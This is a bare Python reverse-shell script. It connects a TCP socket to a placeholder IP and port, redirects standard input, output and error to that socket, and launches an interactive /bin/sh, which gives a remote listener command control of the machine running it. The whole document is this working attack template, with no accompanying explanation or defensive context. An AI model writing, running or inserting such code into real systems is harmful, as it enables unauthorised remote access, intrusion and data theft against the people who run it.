import socket, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = ""
port = 0 #input port
s.connect((ip, port))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.system("/bin/sh -i")

